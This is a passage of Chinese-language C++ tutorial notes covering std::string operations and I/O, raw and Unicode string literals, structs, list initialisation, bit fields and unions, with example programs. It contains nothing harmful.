&lt;string&gt; // 必须包含 string 头文件int main() &#123; // 声明 string 对象 std::string s1; // 创建一个空字符串 std::string s2 = &quot;Hello&quot;; // 使用 C 风格字符串字面值初始化 std::string s3(&quot;World&quot;); // 使用 C 风格字符串字面值初始化 (构造函数语法) std::string s4 = s2; // 使用另一个 string 对象初始化 (复制) std::cout &lt;&lt; &quot;s1: &quot; &lt;&lt; s1 &lt;&lt; std::endl; // 输出空行 std::cout &lt;&lt; &quot;s2: &quot; &lt;&lt; s2 &lt;&lt; std::endl; // 输出 Hello std::cout &lt;&lt; &quot;s3: &quot; &lt;&lt; s3 &lt;&lt; std::endl; // 输出 World std::cout &lt;&lt; &quot;s4: &quot; &lt;&lt; s4 &lt;&lt; std::endl; // 输出 Hello // string 对象可以像普通变量一样使用 std::string message = s2 + &quot;, &quot; + s3 + &quot;!&quot;; // 字符串拼接 std::cout &lt;&lt; &quot;Message: &quot; &lt;&lt; message &lt;&lt; std::endl; // 输出 Hello, World! return 0;&#125; 4.3.1 C++11字符串初始化C++11 引入的列表初始化（花括号初始化）也可以用于 string 对象，其行为类似于使用 C 风格字符串字面值进行初始化。 语法: 123456#include &lt;string&gt;std::string str1 &#123; &quot;Initialized with braces&quot; &#125;; // 使用 C 风格字符串字面值std::string str2 = &#123; &quot;Also works with =&quot; &#125;; // std::string str3 &#123; &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; &#125;; // C++11 中通常不直接用字符列表初始化 string (会尝试调用匹配的构造函数)// std::string str4 = &#123; &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27; &#125;; // 同上 注意: 直接使用字符列表 &#123; &#39;a&#39;, &#39;b&#39;, &#39;c&#39; &#125; 来初始化 std::string 在 C++11/14 中通常不会按预期工作，因为它会尝试查找接受 std::initializer_list&lt;char&gt; 的构造函数，而标准 std::string 没有这样的构造函数。它通常会被解释为尝试调用接受 C 风格字符串 ( const char* ) 的构造函数，但这需要列表恰好能形成一个有效的 C 风格字符串（例如，包含 \\0）。 最常用和清晰的初始化方式仍然是使用字符串字面值或另一个 string 对象。 用法与示例: 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string greeting1 &#123; &quot;Good morning&quot; &#125;; std::string greeting2 = &#123; &quot;Good afternoon&quot; &#125;; // std::string letters &#123; &#x27;H&#x27;, &#x27;i&#x27;, &#x27;\\0&#x27; &#125;; // 可能不按预期工作或编译错误 std::cout &lt;&lt; greeting1 &lt;&lt; std::endl; // 输出 Good morning std::cout &lt;&lt; greeting2 &lt;&lt; std::endl; // 输出 Good afternoon // 推荐的初始化方式 std::string s1 = &quot;Hello&quot;; // C 风格字面值 std::string s2(&quot;World&quot;); // 构造函数语法 std::string s3 = s1; // 复制构造 std::string s4(10, &#x27;c&#x27;); // 创建包含 10 个 &#x27;c&#x27; 的字符串 &quot;cccccccccc&quot; std::cout &lt;&lt; &quot;s4: &quot; &lt;&lt; s4 &lt;&lt; std::endl; return 0;&#125; 4.3.2 赋值、拼接和附加string 类重载了常见的运算符，使得赋值、拼接和附加操作非常直观。 赋值 (=): 可以将一个 string 对象、一个 C 风格字符串字面值或一个 char 赋给一个 string 对象。 拼接 (+): 可以使用 + 运算符将两个 string 对象、string 对象和 C 风格字符串字面值、或者 string 对象和 char 拼接起来，生成一个新的 string 对象。注意：不能直接拼接两个 C 风格字符串字面值，至少有一个操作数需要是 string 对象。 附加 (+=): 可以使用 += 运算符将一个 string 对象、一个 C 风格字符串字面值或一个 char 附加到现有 string 对象的末尾（修改原字符串）。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string s1 = &quot;Hello&quot;; std::string s2 = &quot;World&quot;; std::string s3; std::string s4; // 赋值 s3 = s1; // s3 变为 &quot;Hello&quot; std::cout &lt;&lt; &quot;s3 after assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; s3 = &quot;Goodbye&quot;; // s3 变为 &quot;Goodbye&quot; std::cout &lt;&lt; &quot;s3 after new assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; s3 = &#x27;X&#x27;; // s3 变为 &quot;X&quot; std::cout &lt;&lt; &quot;s3 after char assignment: &quot; &lt;&lt; s3 &lt;&lt; std::endl; // 拼接 (+) - 创建新字符串 s4 = s1 + &quot; &quot; + s2 + &quot;!&quot;; // s4 变为 &quot;Hello World!&quot; std::cout &lt;&lt; &quot;s4 (concatenated): &quot; &lt;&lt; s4 &lt;&lt; std::endl; std::string s5 = s1 + &#x27;!&#x27;; // s5 变为 &quot;Hello!&quot; std::cout &lt;&lt; &quot;s5 (string + char): &quot; &lt;&lt; s5 &lt;&lt; std::endl; // 错误: 不能直接拼接两个 C 风格字符串字面值 // std::string error_str = &quot;String1&quot; + &quot;String2&quot;; // 编译错误! // 正确: 至少有一个是 string 对象 std::string ok_str1 = s1 + &quot; String2&quot;; std::string ok_str2 = &quot;String1&quot; + s2; std::cout &lt;&lt; &quot;ok_str1: &quot; &lt;&lt; ok_str1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;ok_str2: &quot; &lt;&lt; ok_str2 &lt;&lt; std::endl; // 附加 (+=) - 修改原字符串 s1 += &quot; &quot;; // s1 变为 &quot;Hello &quot; s1 += s2; // s1 变为 &quot;Hello World&quot; s1 += &#x27;!&#x27;; // s1 变为 &quot;Hello World!&quot; std::cout &lt;&lt; &quot;s1 after append: &quot; &lt;&lt; s1 &lt;&lt; std::endl; return 0;&#125; 4.3.3 string类的其他操作string 类提供了大量成员函数来执行各种字符串操作。以下是一些常用的操作： 获取长度/大小: size() 或 length(): 返回字符串中的字符数（两者功能相同）。 检查是否为空: empty(): 如果字符串为空，返回 true，否则返回 false。 访问字符: [] 运算符: 像数组一样通过索引访问字符（不进行边界检查）。 at(): 通过索引访问字符（进行边界检查，如果越界会抛出 std::out_of_range 异常）。 查找: find(): 查找子字符串或字符首次出现的位置，返回索引；如果未找到，返回 std::string::npos (一个特殊的静态成员常量)。 rfind(): 从后向前查找。 find_first_of(), find_last_of(), find_first_not_of(), find_last_not_of(): 查找字符集中的任意字符或非任意字符。 子字符串: substr(pos, count): 返回从位置 pos 开始，长度为 count 的子字符串。 比较: compare(): 比较字符串（字典序），返回负数、零或正数。 重载的关系运算符 (==, !=, &lt;, &gt;, &lt;=, &gt;=): 可以直接比较 string 对象。 修改: insert(): 在指定位置插入字符或字符串。 erase(): 删除指定位置和数量的字符。 replace(): 替换指定范围的字符。 clear(): 清空字符串。 append(): 等同于 +=。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;stdexcept&gt; // 为了 std::out_of_rangeint main() &#123; std::string text = &quot;Hello C++ World!&quot;; // 长度和空检查 std::cout &lt;&lt; &quot;Text: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; text.length() &lt;&lt; std::endl; // 输出 16 std::cout &lt;&lt; &quot;Is empty? &quot; &lt;&lt; std::boolalpha &lt;&lt; text.empty() &lt;&lt; std::endl; // 输出 false // 访问字符 std::cout &lt;&lt; &quot;First char (operator[]): &quot; &lt;&lt; text[0] &lt;&lt; std::endl; // 输出 H std::cout &lt;&lt; &quot;Fifth char (at()): &quot; &lt;&lt; text.at(4) &lt;&lt; std::endl; // 输出 o // std::cout &lt;&lt; text.at(20); // 会抛出 std::out_of_range 异常 // 查找 size_t pos_cpp = text.find(&quot;C++&quot;); if (pos_cpp != std::string::npos) &#123; std::cout &lt;&lt; &quot;\\&quot;C++\\&quot; found at index: &quot; &lt;&lt; pos_cpp &lt;&lt; std::endl; // 输出 6 &#125; else &#123; std::cout &lt;&lt; &quot;\\&quot;C++\\&quot; not found.&quot; &lt;&lt; std::endl; &#125; size_t pos_l = text.find(&#x27;l&#x27;); // 查找第一个 &#x27;l&#x27; std::cout &lt;&lt; &quot;First &#x27;l&#x27; found at index: &quot; &lt;&lt; pos_l &lt;&lt; std::endl; // 输出 2 size_t pos_last_l = text.rfind(&#x27;l&#x27;); // 查找最后一个 &#x27;l&#x27; std::cout &lt;&lt; &quot;Last &#x27;l&#x27; found at index: &quot; &lt;&lt; pos_last_l &lt;&lt; std::endl; // 输出 12 // 子字符串 std::string sub = text.substr(6, 3); // 从索引 6 开始，取 3 个字符 std::cout &lt;&lt; &quot;Substring (6, 3): \\&quot;&quot; &lt;&lt; sub &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;C++&quot; // 比较 std::string s1 = &quot;apple&quot;; std::string s2 = &quot;apply&quot;; if (s1 &lt; s2) &#123; std::cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; s1 &lt;&lt; &quot;\\&quot; comes before \\&quot;&quot; &lt;&lt; s2 &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; &#125; int cmp_result = s1.compare(s2); // 返回负数，因为 &quot;apple&quot; &lt; &quot;apply&quot; std::cout &lt;&lt; &quot;Compare result: &quot; &lt;&lt; cmp_result &lt;&lt; std::endl; // 修改 text.insert(10, &quot; beautiful&quot;); // 在索引 10 处插入 std::cout &lt;&lt; &quot;After insert: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;Hello C++ beautiful World!&quot; text.erase(6, 4); // 从索引 6 开始，删除 4 个字符 (&quot;C++ &quot;) std::cout &lt;&lt; &quot;After erase: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;Hello beautiful World!&quot; text.replace(6, 9, &quot;gorgeous&quot;); // 从索引 6 开始，替换 9 个字符 (&quot;beautiful&quot;) std::cout &lt;&lt; &quot;After replace: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;Hello gorgeous World!&quot; text.clear(); // 清空字符串 std::cout &lt;&lt; &quot;After clear, is empty? &quot; &lt;&lt; std::boolalpha &lt;&lt; text.empty() &lt;&lt; std::endl; // 输出 true return 0;&#125; 4.3.4 string类I/O可以使用标准的输入输出流对象 cin 和 cout 来方便地读写 string 对象。 输出 (cout &lt;&lt;): &lt;&lt; 运算符被重载，可以直接将 string 对象输出到 cout。 输入 (cin &gt;&gt;): &gt;&gt; 运算符被重载，可以从 cin 读取一个单词（以空白符——空格、制表符、换行符分隔）到 string 对象中。它会自动跳过开头的空白符，然后在遇到下一个空白符时停止读取。 读取整行 (getline()): 如果需要读取包含空格的整行文本，应该使用 getline() 函数（这是一个全局函数，不是 string 的成员函数）。 getline(cin, str): 从 cin 读取一行（直到遇到换行符 \\n），并将内容（不包括换行符）存储到 string 对象 str 中。 getline(cin, str, delimiter): 读取直到遇到指定的 delimiter 字符为止。 用法与示例: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string word1, word2; std::string line; // 输出 std::string message = &quot;Enter two words:&quot;; std::cout &lt;&lt; message &lt;&lt; std::endl; // 输入 (cin &gt;&gt; 读取单词) std::cin &gt;&gt; word1 &gt;&gt; word2; // 输入 &quot;Hello World&quot; (用空格隔开) std::cout &lt;&lt; &quot;Word 1: &quot; &lt;&lt; word1 &lt;&lt; std::endl; // 输出 Hello std::cout &lt;&lt; &quot;Word 2: &quot; &lt;&lt; word2 &lt;&lt; std::endl; // 输出 World // 清除输入缓冲区中可能残留的换行符 (cin &gt;&gt; 之后通常需要) std::cin.ignore(10000, &#x27;\\n&#x27;); // 输入 (getline 读取整行) std::cout &lt;&lt; &quot;Enter a line of text: &quot;; getline(std::cin, line); // 输入 &quot;This is a test line.&quot; std::cout &lt;&lt; &quot;You entered: \\&quot;&quot; &lt;&lt; line &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 输出 &quot;This is a test line.&quot; return 0;&#125; 注意: 在混合使用 cin &gt;&gt; 和 getline(cin, ...) 时要特别小心。cin &gt;&gt; 读取单词后，会将换行符留在输入缓冲区中。如果紧接着调用 getline()，它会立即读到这个换行符并认为读取结束，导致得到一个空字符串。通常需要在 cin &gt;&gt; 之后、getline() 之前清除缓冲区中的换行符，例如使用 std::cin.ignore()。 4.3.5 其他形式的字符串字面值C++11 引入了新的字符串字面值形式，提供了对不同字符编码（如 Unicode）的更好支持。 原始字符串字面值 (Raw String Literal): 语法: R&quot;delimiter(raw_characters)delimiter&quot; delimiter 是一个可选的、最多16个字符的序列（不能包含空格、括号、反斜杠）。 raw_characters 是字符串内容，其中的反斜杠 \\ 和引号 &quot; 等特殊字符不会被转义，按原样解释。 主要用于书写包含大量特殊字符的字符串，如正则表达式、文件路径、HTML/XML代码等，避免大量的反斜杠转义。 示例: R&quot;(C:\\Program Files\\)&quot;, R&quot;delimiter(String with &quot;quotes&quot; and \\backslashes)delimiter&quot; Unicode 字符串字面值: u8&quot;string&quot;: UTF-8 编码的字符串 (类型是 const char[]，但应存储在 std::string 或处理 UTF-8 的地方)。 u&quot;string&quot;: UTF-16 编码的字符串 (类型是 const char16_t[])。 U&quot;string&quot;: UTF-32 编码的字符串 (类型是 const char32_t[])。 用法与示例: 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; // 原始字符串字面值 std::string path1 = &quot;C:\\\\Program Files\\\\My App\\\\&quot;; // 需要转义反斜杠 std::string path2 = R&quot;(C:\\Program Files\\My App\\)&quot;; // 使用原始字符串，无需转义 std::string regex = R&quot;(\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]&#123;2,&#125;\\b)&quot;; // 正则表达式 std::string html = R&quot;delimiter(&lt;html&gt; &lt;head&gt;&lt;title&gt;Raw String&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;p&gt;&quot;Hello!&quot;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;)delimiter&quot;; std::cout &lt;&lt; &quot;Path 1: &quot; &lt;&lt; path1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Path 2: &quot; &lt;&lt; path2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Regex: &quot; &lt;&lt; regex &lt;&lt; std::endl; std::cout &lt;&lt; &quot;HTML:\\n&quot; &lt;&lt; html &lt;&lt; std::endl; // Unicode 字符串字面值 (主要用于需要特定编码的场景) const char* utf8_str = u8&quot;你好，世界&quot;; // UTF-8 (需要支持 UTF-8 的环境/终端才能正确显示) const char16_t* utf16_str = u&quot;你好，世界&quot;; // UTF-16 const char32_t* utf32_str = U&quot;你好，世界&quot;; // UTF-32 std::cout &lt;&lt; &quot;UTF-8 String (may not display correctly): &quot; &lt;&lt; utf8_str &lt;&lt; std::endl; // 处理和打印 UTF-16/32 通常需要专门的库或函数 // std::cout &lt;&lt; utf16_str; // 不能直接用 cout 打印 char16_t* / char32_t* return 0;&#125; 原始字符串字面值在处理包含特殊字符的文本时非常方便。Unicode 字符串字面值则为处理国际化文本提供了标准化的基础。 4.4 结构简介数组允许我们存储多个相同类型的数据。但有时我们需要将不同类型的数据组合成一个单一的、有意义的单元。例如，描述一件商品可能需要商品名称（字符串）、数量（整数）和单价（浮点数）。C++ 的结构 (Structure) 就提供了这种能力。 结构是一种用户定义的复合类型，它允许将多个不同类型的数据项（称为成员 (member) 或**字段 (field)**）捆绑在一起，形成一个新的数据类型。 4.4.1 在程序中使用结构使用结构通常涉及以下步骤： 定义结构: 使用 struct 关键字定义一个新的结构类型，并在花括号 &#123;&#125; 内声明其成员。结构定义通常放在 main() 函数之前或单独的头文件中。 声明结构变量: 使用定义好的结构类型名来声明变量。 访问结构成员: 使用成员运算符（点运算符 .) 来访问结构变量的特定成员。 结构定义语法: 12345struct StructureName &#123; memberType1 memberName1; memberType2 memberName2; // ... more members&#125;; // 注意定义末尾的分号 用法与示例: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt; // 为了使用 string// 1. 定义结构: 描述充气产品的结构体struct Inflatable &#123; std::string name; // 商品名称 (string 类型成员) float volume; // 体积 (float 类型成员) double price; // 价格 (double 类型成员)&#125;;int main() &#123; // 2. 声明结构变量 Inflatable product1; // 声明一个 Inflatable 类型的变量 product1 Inflatable product2; // 声明另一个 Inflatable 类型的变量 product2 // 3. 访问并赋值结构成员 product1.name = &quot;Awesome Air Mattress&quot;; product1.volume = 1.8f; product1.price = 49.99; // 也可以在声明时进行初始化 (C++98/03 风格，需要按顺序) Inflatable product3 = &#123;&quot;Giant Swan Floatie&quot;, 2.5f, 79.95&#125;; // 访问并输出成员 std::cout &lt;&lt; &quot;Product 1 Name: &quot; &lt;&lt; product1.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 1 Price: $&quot; &lt;&lt; product1.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 3 Name: &quot; &lt;&lt; product3.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Product 3 Volume: &quot; &lt;&lt; product3.volume &lt;&lt; &quot; cubic meters&quot; &lt;&lt; std::endl; // 结构变量之间可以直接赋值 (成员逐个复制) product2 = product1; std::cout &lt;&lt; &quot;Product 2 Name (after assignment): &quot; &lt;&lt; product2.name &lt;&lt; std::endl; return 0;&#125; struct Inflatable &#123; ... &#125;;: 定义了一个名为 Inflatable 的新类型。 Inflatable product1;: 创建了一个 Inflatable 类型的变量（对象）。 product1.name = ...;: 使用点运算符访问 product1 的 name 成员并赋值。 4.4.2 C++11结构初始化C++11 引入的列表初始化（花括号初始化）也适用于结构体，提供了更灵活、更安全的初始化方式。 特点: 可以省略等号 =: 与数组类似，可以在初始化时省略等号。 可以按成员顺序初始化: StructType var &#123;value1, value2, ...&#125;; 可以初始化部分成员 (C++20 designated initializers): C++20 允许通过指定成员名进行初始化，可以不按顺序或只初始化部分成员。但在 C++11/14/17 中，通常需要按顺序提供值。 空花括号初始化: StructType var &#123;&#125;; 会将所有成员进行零初始化（数值类型为0，指针为 nullptr，bool 为 false，类类型会调用默认构造函数）。 禁止缩窄转换: 与数组一样，列表初始化不允许可能丢失信息的缩窄转换。 用法与示例: 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;string&gt;struct Product &#123; std::string id; int quantity; double price;&#125;;int main() &#123; // C++11 列表初始化 (省略等号) Product item1 &#123; &quot;A123&quot;, 50, 19.95 &#125;; // 按顺序初始化所有成员 // 省略等号，部分初始化 (C++11/14/17 中，未提供的成员会被值初始化/零初始化) // 注意：这种部分初始化对于包含 std::string 等类类型成员时，行为依赖于这些类的默认构造函数 // Product item2 &#123; &quot;B456&quot;, 100 &#125;; // price 会被零初始化为 0.0 // 空花括号进行零初始化 Product item3 &#123;&#125;; // id 为空字符串, quantity 为 0, price 为 0.0 std::cout &lt;&lt; &quot;Item 1 ID: &quot; &lt;&lt; item1.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item1.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item1.price &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Item 2 ID: &quot; &lt;&lt; item2.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item2.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item2.price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Item 3 ID: \\&quot;&quot; &lt;&lt; item3.id &lt;&lt; &quot;\\&quot;, Qty: &quot; &lt;&lt; item3.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item3.price &lt;&lt; std::endl; // 禁止缩窄转换 // Product item_error &#123; &quot;C789&quot;, 10.5, 25.0 &#125;; // 错误! 10.5 (double) 到 int 是缩窄转换 // C++20 Designated Initializers (如果编译器支持 C++20) // Product item4 &#123; .id = &quot;D001&quot;, .price = 99.99 &#125;; // quantity 会被零初始化 // std::cout &lt;&lt; &quot;Item 4 ID: &quot; &lt;&lt; item4.id &lt;&lt; &quot;, Qty: &quot; &lt;&lt; item4.quantity &lt;&lt; &quot;, Price: &quot; &lt;&lt; item4.price &lt;&lt; std::endl; return 0;&#125; 4.4.3 结构可以将string类作为成员吗是的，绝对可以。 正如在 4.4.1 和 4.4.2 的示例中看到的 (Inflatable 和 Product 结构)，std::string 对象可以像 int、double 或其他任何类型一样作为结构的成员。 这使得结构能够方便地包含文本信息，并利用 string 类提供的所有功能（自动内存管理、拼接、查找等）。 示例回顾: 1234567891011121314151617181920#include &lt;string&gt;struct Student &#123; std::string name; // string 成员 int studentID; double gpa;&#125;;int main() &#123; Student s1 &#123; &quot;Alice Wonderland&quot;, 12345, 3.8 &#125;; Student s2; s2.name = &quot;Bob The Builder&quot;; // 可以像普通 string 一样操作 s2.studentID = 67890; s2.gpa = 3.5; std::cout &lt;&lt; s1.name &lt;&lt; &quot; has GPA: &quot; &lt;&lt; s1.gpa &lt;&lt; std::endl; std::cout &lt;&lt; s2.name &lt;&lt; &quot; has ID: &quot; &lt;&lt; s2.studentID &lt;&lt; std::endl; return 0;&#125; 4.4.4 其他结构属性结构在 C++ 中具有一些方便的属性： 赋值 (Assignment): 可以使用赋值运算符 = 将一个结构变量的值赋给同类型的另一个结构变量。这会执行**成员逐一复制 (memberwise copy)**，即将源结构每个成员的值复制到目标结构对应成员中。 123Student s1 = &#123;&quot;Charlie&quot;, 111, 3.9&#125;;Student s2;s2 = s1; // s2 的 name, studentID, gpa 都被设置为 s1 的值 作为函数参数 (Pass by Value): 可以将结构变量按值传递给函数。函数会收到结构的一个副本，对副本成员的修改不会影响原始结构变量。 1234567void displayStudent(Student s) &#123; // s 是传入结构的一个副本 std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; s.studentID &lt;&lt; &quot;, Name: &quot; &lt;&lt; s.name &lt;&lt; std::endl; s.name = &quot;Changed&quot;; // 只修改副本&#125;// ...displayStudent(s1); // 传递 s1 的副本std::cout &lt;&lt; s1.name; // 输出 &quot;Charlie&quot;，未被改变 作为函数参数 (Pass by Reference/Pointer): 为了避免复制整个结构的开销，或者需要在函数中修改原始结构，通常按引用或指针传递结构。 123456789void updateGPA(Student&amp; s, double newGPA) &#123; // 按引用传递，可以修改原始结构 s.gpa = newGPA;&#125;void printID(const Student* sPtr) &#123; // 按指针传递 (const 防止意外修改) std::cout &lt;&lt; &quot;ID: &quot; &lt;&lt; sPtr-&gt;studentID &lt;&lt; std::endl; // 使用 -&gt; 访问指针指向的结构成员&#125;// ...updateGPA(s1, 4.0); // 修改原始 s1printID(&amp;s1); // 传递 s1 的地址 作为函数返回值: 函数可以返回一个结构。 123456789Student createStudent(std::string name, int id, double gpa) &#123; Student temp; temp.name = name; temp.studentID = id; temp.gpa = gpa; return temp; // 返回一个 Student 结构&#125;// ...Student s3 = createStudent(&quot;David&quot;, 222, 3.7); 这些特性使得结构成为组织和传递相关数据的强大工具。 4.4.5 结构数组可以创建**结构数组 (Array of Structures)**，即数组的每个元素都是一个结构变量。这对于处理一组具有相同结构的数据非常有用，例如一个班级的学生信息、一个商店的库存列表等。 声明和初始化: 声明结构数组与声明普通数组类似，只是元素类型是结构类型。初始化可以使用嵌套的花括号。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;string&gt;struct Student &#123; std::string name; int studentID;&#125;;const int CLASS_SIZE = 3;int main() &#123; // 声明一个包含 CLASS_SIZE 个 Student 结构的数组 Student classRoster[CLASS_SIZE]; // 初始化结构数组 (使用嵌套花括号) Student graduates[2] = &#123; &#123;&quot;Alice&quot;, 101&#125;, // 初始化 graduates[0] &#123;&quot;Bob&quot;, 102&#125; // 初始化 graduates[1] &#125;; // C++11 列表初始化 Student freshmen[CLASS_SIZE] &#123; &#123;&quot;Charlie&quot;, 201&#125;, &#123;&quot;David&quot;, 202&#125;, &#123;&quot;Eve&quot;, 203&#125; &#125;; // 访问结构数组中的元素及其成员 classRoster[0].name = &quot;Frank&quot;; classRoster[0].studentID = 301; std::cout &lt;&lt; &quot;Graduate 1: &quot; &lt;&lt; graduates[0].name &lt;&lt; &quot; (ID: &quot; &lt;&lt; graduates[0].studentID &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Freshman 3 ID: &quot; &lt;&lt; freshmen[2].studentID &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Roster 1 Name: &quot; &lt;&lt; classRoster[0].name &lt;&lt; std::endl; // 遍历结构数组 std::cout &lt;&lt; &quot;\\nFreshmen List:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; CLASS_SIZE; ++i) &#123; std::cout &lt;&lt; &quot; - &quot; &lt;&lt; freshmen[i].name &lt;&lt; &quot; (ID: &quot; &lt;&lt; freshmen[i].studentID &lt;&lt; &quot;)&quot; &lt;&lt; std::endl; &#125; return 0;&#125; Student classRoster[CLASS_SIZE];: 声明了一个数组，每个元素都是 Student 结构。 graduates[0] = &#123;&quot;Alice&quot;, 101&#125;;: 初始化数组的第一个元素（一个 Student 结构）。 freshmen[i].name: 访问数组 freshmen 中索引为 i 的元素的 name 成员。 4.4.6 结构中的位字段位字段 (Bit Field) 是一种特殊的结构成员，它允许你指定成员变量占用的**位数 (bits)**。这主要用于需要精确控制内存布局或与硬件寄存器交互的场景。 语法: 在结构定义中，成员名后面跟一个冒号 : 和一个整数常量，表示该成员占用的位数。 1234567struct RegisterFlags &#123; unsigned int readEnable : 1; // 占用 1 位 unsigned int writeEnable : 1; // 占用 1 位 unsigned int mode : 2; // 占用 2 位 unsigned int reserved : 4; // 占用 4 位 (通常用于填充或对齐) // ...&#125;; 特点和注意事项: 类型: 位字段的类型通常是 unsigned int 或 signed int（或 int，其符号性取决于实现），也可以是 bool (C++11，等效于 : 1)。 内存节省: 当多个标志或小范围数值需要存储时，位字段可以显著节省内存，将它们打包到单个整数或几个字节中。 硬件接口: 常用于映射硬件设备寄存器的特定位。 访问: 像普通结构成员一样使用点运算符访问，但不能获取位字段的地址（&amp; 运算符不能用于位字段）。 可移植性: 位字段的内存布局（位的排列顺序、跨字节边界的处理）可能因编译器和平台而异，因此在需要跨平台兼容性的代码中应谨慎使用。 大小限制: 位数不能超过其基础类型的位数（例如，unsigned int 的位字段不能超过 int 的位数）。 匿名位字段: 可以使用未命名的位字段来填充或对齐，例如 unsigned int : 2;。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;// 假设用于控制某个设备的状态struct DeviceStatus &#123; // 打包到单个字节 (假设 unsigned int 至少 8 位) unsigned int powerOn : 1; unsigned int errorFlag : 1; unsigned int channel : 3; // 可以表示 0-7 unsigned int : 3; // 填充未使用的 3 位，使总共 8 位&#125;;int main() &#123; DeviceStatus status; // 设置位字段的值 status.powerOn = 1; // 设备开机 status.errorFlag = 0; // 无错误 status.channel = 5; // 设置通道为 5 // 读取位字段的值 std::cout &lt;&lt; &quot;Device Status:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Power On: &quot; &lt;&lt; status.powerOn &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Error Flag: &quot; &lt;&lt; status.errorFlag &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Channel: &quot; &lt;&lt; status.channel &lt;&lt; std::endl; // 位字段通常打包存储 std::cout &lt;&lt; &quot;Size of DeviceStatus struct: &quot; &lt;&lt; sizeof(DeviceStatus) &lt;&lt; &quot; byte(s)&quot; &lt;&lt; std::endl; // 输出通常是 1 或 4 (取决于编译器如何对齐和打包，以及 int 的大小) // 检查特定标志 if (status.powerOn) &#123; std::cout &lt;&lt; &quot;Device is powered on.&quot; &lt;&lt; std::endl; &#125; // 不能获取位字段地址 // unsigned int* pPower = &amp;status.powerOn; // 错误! return 0;&#125; 位字段是一种底层工具，适用于特定场景，但在常规应用程序开发中不常用。 4.5 共用体共用体 (Union) 是一种特殊的数据结构，它也允许在一个结构中存储不同的数据类型，但与结构体 (struct) 不同的是，共用体的所有成员共享同一块内存空间。 核心特点: 内存共享: 共用体的大小由其最大的成员的大小决定。所有成员都从相同的内存地址开始存储。 同一时间只有一个成员有效: 在任何时刻，你只能有效地存储和使用共用体中的一个成员的值。当你给一个成员赋值时，可能会覆盖掉其他成员的数据。 节省内存: 当你需要存储多种类型的数据，但知道在任何时候只需要用到其中一种时，共用体可以节省内存，因为它只需要分配足够容纳最大成员的空间。 定义共用体: 使用 union 关键字定义，语法与 struct 类似。 12345union UnionName &#123; memberType1 memberName1; memberType2 memberName2; // ... more members&#125;; // 注意定义末尾的分号 访问成员: 与结构体一样，使用成员运算符（点运算符 .) 来访问共用体变量的成员。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;// 定义一个共用体，可以存储 int, long 或 doubleunion DataValue &#123; int i_val; long l_val; double d_val;&#125;;int main() &#123; DataValue data; // 声明一个 DataValue 共用体变量 std::cout &lt;&lt; &quot;Size of DataValue union: &quot; &lt;&lt; sizeof(DataValue) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // 输出的大小通常等于 sizeof(double)，因为它是最大的成员 // 存储并使用 int 成员 data.i_val = 100; std::cout &lt;&lt; &quot;Stored as int: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // 此时访问 l_val 或 d_val 的结果是未定义的/无意义的 // 存储并使用 double 成员 (会覆盖之前的 int 值) data.d_val = 3.14159; std::cout &lt;&lt; &quot;Stored as double: &quot; &lt;&lt; data.d_val &lt;&lt; std::endl; // 此时访问 i_val 或 l_val 的结果是未定义的/无意义的 // std::cout &lt;&lt; &quot;Reading i_val after storing double: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // 